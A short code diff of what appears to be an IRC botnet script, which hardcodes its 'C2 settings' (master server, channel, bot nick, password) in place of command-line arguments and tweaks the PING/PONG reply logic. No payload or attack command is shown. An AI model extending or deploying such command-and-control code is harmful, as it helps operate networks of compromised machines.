@@ -12,16 +12,10 @@ slavelist  = [ircnet, efnet, freenode]
 
 #########################
 #C2 settings:
-if len(sys.argv) < 2:
-    master = freenode
-    channel = "#nicenicebot"
-    botnick = "nicebot"
-    password = "nicepass"
-else:
-    master = str(sys.argv[1])
-    channel = str(sys.argv[2])
-    botnick = str(sys.argv[3])
-    password = str(sys.argv[4])
+master = freenode
+channel = "#nicenicebot"
+botnick = "nicebot"
+password = "nicepass"
 #########################
 
 def openConn(server):
@@ -40,7 +34,7 @@ def closeConn(soc):
         
 def ping(recieved, server, soc):
     if recieved.find("PING") != -1:     
-        if server in [efnet]:
+        if server  == efnet:
             soc.send("\QUOTE PONG " + recieved.split() [1] + "\n")
         else:
             soc.send("PONG " + recieved.split() [1] + "\n")
